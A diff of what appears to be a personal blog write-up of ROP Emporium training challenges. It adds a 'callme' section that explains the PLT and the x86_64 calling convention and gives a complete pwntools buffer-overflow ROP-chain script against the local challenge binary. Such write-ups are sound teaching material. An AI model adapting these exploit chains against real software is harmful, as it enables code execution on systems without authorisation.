@@ -2,7 +2,7 @@
 layout: default
 title: "ROP emporium"
 category: "pwn"
-tags: [pwn, x86_64, rop]
+tags: [x86_64, rop]
 date: 2026-09-09
 description: "my solutions for the challenges of the ROP emporium series"
 ---
@@ -38,6 +38,7 @@ argument of any function, so what we want to do with the info we are given is to
 we had to find the addresses for the pop rdi gadget, the system call and the string we need to use through gdb,
 thankfully there are intentionally placed functions and strings in the binary which give us these for free:
 ```
+pwndbg> disas usefulFunction
 Dump of assembler code for function usefulFunction:
    0x0000000000400742 <+0>:     push   rbp
    0x0000000000400743 <+1>:     mov    rbp,rsp
@@ -94,4 +95,56 @@ payload = flat(
 io.send(payload)
 io.interactive()
 ```
+
+## callme
+this challenge tasks us with calling 3 different plt function entries with 3 arguments
+
+-  the plt (procedure linkage table) is a mechanism which links our executable code with external libraries' code, because of aslr, external libraries are always loaded into random memory addresses, the plt uses predictable addresses to call those external functions so the compiler doesn`t need to guess the addresses, the good thing about the plt is that in the end we don't need to guess them to write our exploit neither (except if PIE is enabled, but it doesn't matter for this challenge as it is turned off)
+
+we are asked to call `callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`, `callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`, `callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`
+
+since we don't know the actuall addresses of these functions in the external library we leverage the plt which uses fixed addresses (no PIE), we also apply the same concept from the previous challenge except we have to
+use three arguments, in the x86_64 calling convention the first 3 arguments of a function are in this order rdi, rsi, rdx, with rdi being the first argument and rdx being the 3rd, we construct the final solve script based
+on these principles:
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+
+elf = ELF('./callme')
+rop = ROP(elf)
+io = process(elf.path)
+
+offset = 40
+
+pop_rdi_rsi_rdx = rop.find_gadget(['pop rdi','pop rsi','pop rdx','ret'])[0]
+
+arg1 = 0xdeadbeefdeadbeef
+arg2 = 0xcafebabecafebabe
+arg3 = 0xd00df00dd00df00d
+
+callme_one_plt = elf.plt['callme_one']
+callme_two_plt = elf.plt['callme_two']
+callme_three_plt = elf.plt['callme_three']
+
+payload = b'A' * offset
+
+def build_call(func):
+	chain = p64(pop_rdi_rsi_rdx)
+	chain += p64(arg1)
+	chain += p64(arg2)
+	chain += p64(arg3)
+	chain += p64(func)
+	return chain
+
+payload += build_call(callme_one_plt)
+payload += build_call(callme_two_plt)
+payload += build_call(callme_three_plt)
+
+io.sendlineafter(b'> ', payload)
+io.interactive()
+```
+
+
 
